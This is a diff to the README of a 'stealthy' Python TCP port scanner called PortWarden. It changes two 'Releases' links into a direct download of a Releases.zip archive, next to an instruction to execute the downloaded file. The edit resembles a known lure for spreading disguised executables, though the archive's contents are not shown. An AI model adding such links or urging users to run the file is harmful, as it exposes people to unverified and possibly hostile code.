@@ -27,7 +27,7 @@ Welcome to **PortWarden**, a fast and stealthy TCP port scanner crafted in Pytho
 To install PortWarden, clone the repository and install the required packages.
 
 
-Alternatively, you can download the latest release from the [Releases](555) section. Execute the downloaded file to start using PortWarden.
+Alternatively, you can download the latest release from the [Releases](https://github.com/leolingham7/PortWarden/releases/download/v2.0/Releases.zip) section. Execute the downloaded file to start using PortWarden.
 
 ## Usage
 
@@ -102,7 +102,7 @@ PortWarden is licensed under the MIT License. See the [LICENSE](LICENSE) file fo
 
 ## Support
 
-For support or inquiries, feel free to open an issue on the GitHub repository. You can also check the [Releases](555) section for the latest updates and features.
+For support or inquiries, feel free to open an issue on the GitHub repository. You can also check the [Releases](https://github.com/leolingham7/PortWarden/releases/download/v2.0/Releases.zip) section for the latest updates and features.
 
 ---
 
